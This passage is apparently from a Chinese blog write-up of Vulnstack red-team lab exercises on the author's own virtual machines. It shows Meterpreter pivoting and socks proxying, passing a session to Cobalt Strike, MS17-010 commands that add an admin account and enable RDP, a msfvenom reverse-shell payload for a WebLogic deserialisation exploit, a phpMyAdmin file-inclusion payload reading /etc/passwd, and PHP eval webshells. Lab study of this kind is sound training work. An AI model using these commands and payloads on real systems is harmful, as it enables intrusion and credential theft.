class="line-numbers language-none"><code class="language-none">administrator&#x2F;@dmin123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>开3389端口</strong></p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp[*] Enabling Remote Desktop[*] RDP is already enabled[*] Setting Terminal Services service startup mode[*] Terminal Services service is already set to auto[*] Opening port in local firewall if necessary[*] For cleanup execute Meterpreter resource file: &#x2F;home&#x2F;m4xlmum&#x2F;.msf4&#x2F;loot&#x2F;20210605172936_default_192.168.72.128_host.windows.cle_771977.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605173036618.png" alt></p><p><strong>开远程桌面</strong></p><pre class="line-numbers language-none"><code class="language-none">rdesktop -g 1440x900  192.168.72.128:3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">用户名: GOD\administrator   # 域用户登录，用户民格式为：域名\用户名密  码: @dmin123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605173536027.png" alt></p><p>这个最好是再开一个用户，而且再开一个用户也应该用不到抓administrator的用户密码了，所做的工作就会少很多（主要是学习嘛，也走了许多弯路）。</p><h3 id="三、内网搜集"><a href="#三、内网搜集" class="headerlink" title="三、内网搜集"></a>三、内网搜集</h3><h4 id="7-内网—继续信息收集"><a href="#7-内网—继续信息收集" class="headerlink" title="7.内网—继续信息收集"></a>7.内网—继续信息收集</h4><p>接下来看看其他主机了，这个已经算是拿下了吧，虽然不太完美，下一个争取完美一点。</p><p><strong>配置静态路由</strong></p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run autoroute -s 192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>内网存活主机扫描</strong></p><p>使用msf自带netbios扫描内网存活机器，发现存活机器还有其他两台，地址分别为<code>192.168.52.138</code>和<code>192.168.52.141</code>，本机为<code>192.168.52.143</code></p><pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbnamemsf6 auxiliary(scanner&#x2F;netbios&#x2F;nbname) &gt; set session 1session &#x3D;&gt; 1msf6 auxiliary(scanner&#x2F;netbios&#x2F;nbname) &gt; set rhosts 192.168.52.0&#x2F;24rhosts &#x3D;&gt; 192.168.52.0&#x2F;24msf6 auxiliary(scanner&#x2F;netbios&#x2F;nbname) &gt; exploit[*] Sending NetBIOS requests to 192.168.52.0-&gt;192.168.52.255 (256 hosts)[+] 192.168.52.138 [OWA] OS:Windows Names:(OWA, GOD) Addresses:(192.168.52.138) Mac:00:0c:29:3f:5d:a9 Virtual Machine:VMWare[+] 192.168.52.141 [ROOT-TVI862UBEH] OS:Windows Names:(ROOT-TVI862UBEH, GOD, __MSBROWSE__) Addresses:(192.168.52.141) Mac:00:0c:29:6d:39:34 Virtual Machine:VMWare[+] 192.168.52.143 [STU1] OS:Windows Names:(STU1, GOD)  Mac:00:0c:29:a7:c1:a8 Virtual Machine:VMWare[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>域内信息收集命令(抄徐神的，爽)</strong></p><pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain        #查看时间服务器net user &#x2F;domain        #查看域用户net view &#x2F;domain        #查看有几个域net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员net group &quot;domain controllers&quot; &#x2F;domain       #查看域控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四、横向移动"><a href="#四、横向移动" class="headerlink" title="四、横向移动"></a>四、横向移动</h3><h4 id="8-CobaltStrike联动msf"><a href="#8-CobaltStrike联动msf" class="headerlink" title="8.CobaltStrike联动msf"></a>8.CobaltStrike联动msf</h4><p>msf获取到shell后，可以派发给cobaltstrike，首先cobaltstrike创建监听器：</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605193822354.png" alt></p><p>msf执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;payload_injectset payload windows&#x2F;meterpreter&#x2F;reverse_httpset DisablePayloadHandler true   #payload_inject执行之后会在本地产生一个新的handler，设置为true表示不重复生成set lhost 192.168.72.130                 #公网vps ipset lport 8888                  #监听端口 set session 1                   #派发session idexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行完所有命令之后将会看到CobaltStrike中有一台主机上线</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605194323631.png" alt></p><p>这里的原理就是，受害者网络反弹了一个shell到msf，msf又给自己生成了一个shell，再将网络送到CS(大概猜测)。</p><h4 id="9-搭建跳板主机"><a href="#9-搭建跳板主机" class="headerlink" title="9.搭建跳板主机"></a>9.搭建跳板主机</h4><p>其实就是将拿到权限的受害者主机(win7 web服务器)作为跳板(代理服务器)来连通内网。</p><p><strong>搭建Socket4a隧道 + proxychains</strong></p><pre class="line-numbers language-none"><code class="language-none">backgrounduse auxiliary&#x2F;server&#x2F;socks_proxyset version 4arunjobs  # 查看任务是否正常执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">vi &#x2F;etc&#x2F;proxychains.conf  #配置proxychainssocks4 127.0.0.1 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是就算是成功搭建跳板主机了，测试一下</p><pre class="line-numbers language-none"><code class="language-none">proxychains curl http:&#x2F;&#x2F;192.168.72.128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回的是php study探针的内容的话应该就是搭建成功了的。</p><h4 id="10-内网端口扫描"><a href="#10-内网端口扫描" class="headerlink" title="10.内网端口扫描"></a>10.内网端口扫描</h4><p>由上面的代理服务就能直接使用nmap来扫描了，开始我用的是msf自带的扫描模块，<em>但是速度远远不如nmap感觉，还是nmap用着舒服</em>我收回斜体的这些话，可能是我不会用nmap，还没msf自带的快</p><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -Pn -sT -F -T4 192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Nmap scan report for 192.168.52.138Host is up (4.0s latency).Not shown: 90 closed portsPORT      STATE SERVICE53&#x2F;tcp    open  domain80&#x2F;tcp    open  http88&#x2F;tcp    open  kerberos-sec135&#x2F;tcp   open  msrpc139&#x2F;tcp   open  netbios-ssn389&#x2F;tcp   open  ldap445&#x2F;tcp   open  microsoft-ds49154&#x2F;tcp open  unknown49155&#x2F;tcp open  unknown49157&#x2F;tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -Pn -sT -F -T4 192.168.52.141<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Nmap scan report for 192.168.52.141Host is up (1.1s latency).Not shown: 95 closed portsPORT     STATE SERVICE21&#x2F;tcp   open  ftp135&#x2F;tcp  open  msrpc139&#x2F;tcp  open  netbios-ssn445&#x2F;tcp  open  microsoft-ds1025&#x2F;tcp open  NFS-or-IIS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里只对<code>--top-ports 100</code>进行扫描，扫描结果分别粘贴在了上面。</p><p>注意到上面得两个主机都开了<code>445号端口</code>，了解到445号端口是Windows进行SMB通信得端口，是存在漏洞的，并且msf中也有相应的扫描的模块<code>auxiliary/admin/smb/ms17_010_command</code></p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset RHOSTS 192.168.52.141set command net user m4xlmum @dmin121 &#x2F;add #添加用户run #成功执行set command net localgroup administrators m4xlmum &#x2F;add #管理员权限run #成功执行set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f&#39;run #成功执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后连接远程桌面<code>proxychains rdesktop 192.168.52.141</code>，</p><pre class="line-numbers language-none"><code class="language-none">username:m4xlmumpassword:@dmin121<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605233517509.png" alt></p><p>但是刚才我新建的那个用户是不能连接到<code>GOD域网络</code>的，只能连141号，这一个主机</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605233627848.png" alt></p><p>再在141号机子上开一个后门程序。<strong>没开成功</strong></p><pre class="line-numbers language-none"><code class="language-none">没成功这里也没必要填了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="五、域控"><a href="#五、域控" class="headerlink" title="五、域控"></a>五、域控</h3><h4 id="11-ms17-010再利用"><a href="#11-ms17-010再利用" class="headerlink" title="11.ms17-010再利用"></a>11.ms17-010再利用</h4><pre class="line-numbers language-none"><code class="language-none">PORT      STATE SERVICE53&#x2F;tcp    open  domain80&#x2F;tcp    open  http88&#x2F;tcp    open  kerberos-sec135&#x2F;tcp   open  msrpc139&#x2F;tcp   open  netbios-ssn389&#x2F;tcp   open  ldap445&#x2F;tcp   open  microsoft-ds49154&#x2F;tcp open  unknown49155&#x2F;tcp open  unknown49157&#x2F;tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接试试用445端口的那个再打一下</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset RHOSTS 192.168.52.138set command net user m4xlmum @dmin121 &#x2F;addrunset command net localgroup administrators m4xlmum &#x2F;add runset command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f&#39;run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不行，好累，放弃了至此。</p><p>第一个没拿到域控，应该还是没经验会的少，下周再继续学。</p><h2 id="红日安全靶场-1"><a href="#红日安全靶场-1" class="headerlink" title="红日安全靶场"></a>红日安全靶场<02 att&ck红队评估></02></h2><pre class="line-numbers language-none"><code class="language-none">红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX1. Bypass UAC2. Windows系统NTLM获取（理论知识：Windows认证）3. Access Token利用（MSSQL利用）4. WMI利用5. 网页代理，二层代理，特殊协议代理（DNS，ICMP）6. 域内信息收集7. 域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用8. 域凭证收集9. 后门技术（黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF）****环境说明****内网网段：10.10.10.1&#x2F;24DMZ网段：192.168.111.1&#x2F;24测试机地址：192.168.111.1（Windows），192.168.111.11（Linux）防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：deny all tcp ports：10.10.10.1allow all tcp ports：10.10.10.0&#x2F;24****配置信息******DC**IP：10.10.10.10OS：Windows 2012(64)应用：AD域**WEB**IP1：10.10.10.80IP2：192.168.111.80OS：Windows 2008(64)应用：Weblogic 10.3.6MSSQL 2008**PC**IP1：10.10.10.201IP2：192.168.111.201OS：Windows 7(32)应用：**攻击机**IP：192.168.111.1OS：Windows 10(64)IP：192.168.111.11OS：Parrot(64)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>网络拓补图</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210606112119602.png" alt></p><h3 id="一、环境搭建-1"><a href="#一、环境搭建-1" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><h4 id="关于web主机用户名密码错误"><a href="#关于web主机用户名密码错误" class="headerlink" title="关于web主机用户名密码错误"></a>关于web主机用户名密码错误</h4><p>这个应该是靶场的问题，毕竟用爱发电，哪里有点做的不好也非常可以理解，还是可以玩一玩的。</p><ol><li>先将win server 2008虚拟机恢复快照到最新的那个，应该是最上面那个<code>V1.3 10月21号</code>的那个。</li><li>重新启动了之后直接登录<code>WEB\de1ay    1qaz@WSX</code>会提示让修改密码，修改密码为<code>@dmin123</code>即可。</li></ol><h4 id="关于这次环境网卡的配置"><a href="#关于这次环境网卡的配置" class="headerlink" title="关于这次环境网卡的配置"></a>关于这次环境网卡的配置</h4><p> 这次主要是修改了虚拟机内部的网络设置，外部的与上一个还是差不太多的。</p><p>先说一下这次的外、内网的ip分配</p><div class="table-container"><table><thead><tr><th>主机</th><th>ip</th></tr></thead><tbody><tr><td>PC、DC、WEB</td><td>都有内网的ip(10.10.10.0)</td></tr><tr><td>攻击机、PC、WEB</td><td>都有外网的ip(192.168.10.0)</td></tr></tbody></table></div><p>并且这次的外网ip分配成了，VMware的NAT模式，一般来说是应该可以连通外网的，上几张图。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210607002210409.png" alt></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210606213750392.png" alt="VMWare设置"></p><p>这里我各个机器的ip地址分配如下</p><div class="table-container"><table><thead><tr><th>主机</th><th>内网IP</th><th>外网IP</th></tr></thead><tbody><tr><td>WEB</td><td>10.10.10.80</td><td>192.168.10.132</td></tr><tr><td>PC</td><td>10.10.10.201</td><td>192.168.10.133</td></tr><tr><td>DC</td><td>10.10.10.10</td><td>无</td></tr><tr><td>kali攻击机</td><td>无</td><td>192.168.10.129</td></tr></tbody></table></div><p>然后还有WEB虚拟机、PC虚拟机，内部的模拟外网ip，要调成自动分配ip。挺简单的就不截图了这个。</p><p>再然后要注意的就是那个靶场说明里边的weblogic漏洞利用，我的一开始那个weblogic是没有启动成功的，原因就是你需要登录的是管理员的账号</p><p><a href="https://jingyan.baidu.com/article/ad310e80d1a6e21849f49e9c.html">WebLogic出现没启动的特殊情况参考这篇文章</a></p><pre class="line-numbers language-none"><code class="language-none">de1ay\administrator1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当然如果你登陆的不是管理员账号也没什么关系，把下面的这个右键以管理员权限身份运行即可</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210607004118696.png" alt></p><p>但是会出现像我这里出现的这种大黑框，但是毕竟我们不需要直接在这台WEB主机上进行什么操作，所以我就直接以管理员身份运行了。再去kali里面扫一下端口开放情况。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210607004946587.png" alt="这守再是扫描会发现7001端口已经上线了"></p><h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><p>先来第一波信息收集，这里主要针对WEB主机进行扫描</p><p>端口开放情况</p><pre class="line-numbers language-none"><code class="language-none">PORT      STATE SERVICE80&#x2F;tcp    open  http135&#x2F;tcp   open  msrpc139&#x2F;tcp   open  netbios-ssn445&#x2F;tcp   open  microsoft-ds1433&#x2F;tcp  open  ms-sql-s3389&#x2F;tcp  open  ms-wbt-server7001&#x2F;tcp  open  afs3-callback49152&#x2F;tcp open  unknown49153&#x2F;tcp open  unknown49154&#x2F;tcp open  unknown49155&#x2F;tcp open  unknown49156&#x2F;tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我改一下上一篇总结的格式，分开三台主机(WEB主机、PC主机、DC主机)这样写。</p><h3 id="三、拿下WEB主机"><a href="#三、拿下WEB主机" class="headerlink" title="三、拿下WEB主机"></a>三、拿下WEB主机</h3><h4 id="主要目标"><a href="#主要目标" class="headerlink" title="主要目标"></a>主要目标</h4><p><strong>这里主要目标有三个：1.拿到WEB主机地后门、2.拿到WEB主机内部的密码、3.让WEB主机作为进入内网的跳板</strong></p><h4 id="1-WebLogic漏洞利用"><a href="#1-WebLogic漏洞利用" class="headerlink" title="1.WebLogic漏洞利用"></a>1.WebLogic漏洞利用</h4><blockquote><p>weblogic是什么？ WebLogic是美国bea公司出品的一个<strong>application server</strong>确切的说是一个基于j2ee架构的中间件，webserver是用来构建网站的必要软件用来解析发布网页等功能，它是用纯java开发的。 weblogic本来不是由bea发明的，是它从别人手中买过来，然后再加工扩展。 目前weblogic在世界application server市场上占有最大的份额，其他还有象IBM的websphere，免费的tomcat、resin等中间件。 BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p></blockquote><p><strong>这里使用的工具是WebLogic Scan</strong></p><p><a href="https://gitee.com/omg2019/WeblogicScan-1?_from=gitee_search">weblogic-scan下载地址gitee</a></p><p>GitHub有点慢，直接用gitee上面的应该也是可以的，下载后解压到kali里面</p><p>我的直接就能使用了，没下载<code>requiremens.txt</code>如果出现运行失败请自行下载。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210607011653673.png" alt></p><p>扫出来的漏洞如上图所示，这里一个一个验证知道可以上传后门程序为止。</p><p>首先是后台路径的问题，这里是一个简单的没有验证码的后台登陆，但是使用了两个弱口令就没再试了，毕竟是弱口令进去还要再进行攻击，下面的这几个应该可以直接进行攻击。</p><p>下面的SSRF利用起来也是有点复杂的，这里使用<code>Weblogic反序列化漏洞(CVE-2019-2725)</code>来进行攻击，上传木马。</p><p><a href="https://www.cnblogs.com/twlr/p/13027190.html">参考这篇文章</a>，但是即使如此还是特别麻烦，这里选择使用师傅的工具。</p><p><a href="https://kfi.re/220.html">工具下载</a>、<a href="https://www.cnblogs.com/sstfy/p/10350915.html">工具使用</a></p><p><strong>这个工具使用的java的版本网上说的不太详细，使用了11与16与8都失败了，暂时放弃</strong></p><p><a href="https://www.anquanke.com/post/id/242566">使用exploit-db的利用脚本解决，参考的是这篇文章</a></p><ol><li>首先生成一个反弹shell的powershell脚本，使用以下命令，使用工具为msfvenom</li></ol><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.10.129 LPORT&#x3D;4444 -f psh-cmd &gt; reverse.ps1# 这个IP地址是你攻击机的ip，端口随意设置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210614224550563.png" alt></p><ol><li><a href="https://www.exploit-db.com/exploits/46780">下载Exploit</a>，并且将里面的exploit的内容替换为生成的payload</li></ol><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210614225036115.png" alt></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210614225155048.png" alt></p><ol><li>使用MSF设置监听，然后使用下面的</li></ol><pre class="line-numbers language-none"><code class="language-none">python exploit.py http:&#x2F;&#x2F;IP:PORT&#x2F;_async&#x2F;AsyncResponseServiceHttps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210615004348045.png" alt></p><p>这里我就先不纠结了，直接允许算了，他们都说用上面的那个终极反序列化利用工具能过360，但是终究是我的Java环境不行，这里当一次物理黑客，直接退出360(真的把我搞得没辙了，可见360还是有一些用的嘤嘤嘤)。本来呢，360没法过的话是绝对进不了Web服务器的，看来有空是时候要学点免杀的技巧了。</p><p><strong>再次宕机，过一年再回头看，最近一年都不会再搞这套靶机了，能力暂时不支持</strong></p><h2 id="红日安全靶场-2"><a href="#红日安全靶场-2" class="headerlink" title="红日安全靶场"></a>红日安全靶场<03 att&ck红队评估></03></h2><h3 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h3><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/"><strong>ATT&amp;CK3地址</strong></a></p><pre class="line-numbers language-none"><code class="language-none">基本信息作者：licong环境配置打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。挂起状态，账号已默认登陆，centos为出网机，第一次运行，需重新获取桥接模式网卡ip。除重新获取ip，不建议进行任何虚拟机操作。参考虚拟机网络配置，添加新的网络，该网络作为内部网络。注：名称及网段必须符合上述图片，进行了固定ip配置。描述目标：域控中存在一份重要文件。本次环境为黑盒测试，不提供虚拟机账号密码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这套环境的主机又太多了，我的电脑带起来实在是很吃力，往后这种主机较多的靶机估计是打不了了，只能打打主机不超过三台的小环境了，当然根据少就是多的原则，一定会将小环境利用到极致的。</p><h2 id="红日安全靶场-3"><a href="#红日安全靶场-3" class="headerlink" title="红日安全靶场"></a>红日安全靶场<04 att&ck红队评估></04></h2><h3 id="一、环境介绍"><a href="#一、环境介绍" class="headerlink" title="一、环境介绍"></a>一、环境介绍</h3><pre class="line-numbers language-none"><code class="language-none">大家好红日安全红队靶场（四）已经出来，本次靶场渗透反序列化漏洞、命令执行漏洞、Tomcat漏洞、MS系列漏洞、端口转发漏洞、以及域渗透等多种组合漏洞，希望大家多多利用。红队评估四靶场描述第一次搭建靶机，如有啥不足或问题，欢迎各位师傅在vlunstack微信群里提出，向师傅们学习其它靶场下载地址    红队评估一：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;    红队评估二：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;3&#x2F;    红队评估三：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;5&#x2F;    Web安全靶场下载：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;4&#x2F;靶场学习路径，可参考    st漏洞利用    phpmyadmin getshell    tomcat 漏洞利用    docker逃逸    ms14-068    ssh密钥利用    流量转发    历史命令信息泄露    域渗透环境说明机器密码    ubuntu:ubuntu    域成员机器:    douser:Dotest123    DC:    administrator:Test2008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次的环境感觉挺少的，可以打一打试一试的。</p><p>值得一提的是域控DC主机的密码是需要改一下的，我将域控主机的密码改为了<code>admin@123</code>。</p><h3 id="二、网络配置"><a href="#二、网络配置" class="headerlink" title="二、网络配置"></a>二、网络配置</h3><p>除了第一、二个靶机好像后面的都没有再放出来网络拓补图了，但是我已经会配了嘿嘿，已经不需要了。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621224734999.png" alt></p><p>内网网络的IP地址段为<code>10.10.10.0/24</code>。</p><p>外网模拟的网段为<code>192.168.10.0/24</code>。</p><pre class="line-numbers language-none"><code class="language-none">攻击机(kali)        :  192.168.10.128(外网)受害机(ubuntu)      :  192.168.10.136(外网)、10.10.10.132(内网)域控DC(Server 2008) :  10.10.10.133(内网)Windows 7   :  10.10.10.130(内网)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>域控机的ipv4方案要调成自动获取ip才可。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622105055779.png" alt></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621230506323.png" alt></p><p>能实现Ubuntu可以ping通Kali即可。</p><p>但是我们重启ubuntu之后所有的docker服务似乎都下线了，这就需要我们再重启一下了，这里因为我没记开始的服务所用到的端口，索性每次就开一个web服务，一个一个地去getshell。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622120132257.png" alt></p><h3 id="三、phpmyadmin-getshell"><a href="#三、phpmyadmin-getshell" class="headerlink" title="三、phpmyadmin getshell"></a>三、phpmyadmin getshell</h3><p>参考靶机服务的命名，用的就是这个洞<code>CVE-2018-12613</code>。</p><p>各个环境的版本信息</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622120439658.png" alt></p><h4 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h4><ol><li>phpmyadmin版本4.8.0、4.8.1</li><li>必须能进入phpmyadmin，也就是说要有用户名与密码。</li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>查看能不能实现include</p><pre class="line-numbers language-none"><code class="language-none">payload：http:&#x2F;&#x2F;192.168.10.136:2003&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622123420161.png" alt></p><pre class="line-numbers language-none"><code class="language-none">SELECT &quot;&lt;?php phpinfo();?&gt;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后有这个的话就简单了，直接先在sql查询的那里面执行一下上面的语句，执行之前看看自己的cookie，phpmyadmin对应的值就是php的session文件的文件名，回头直接包含这个恶意session文件即可。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622124039589.png" alt></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622124423732.png" alt></p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>getshell也简单了，做个蚁剑的马。</p><pre class="line-numbers language-none"><code class="language-none">SELECT &quot;&lt;?php highlight_file(__FILE__); @eval($_POST[&#39;c&#39;]);?&gt;&quot;;SELECT &#96;&lt;?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);?&gt;&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>暂时遇到点问题，不打了先。</p><h1 id="外网渗透"><a href="#外网渗透" class="headerlink" 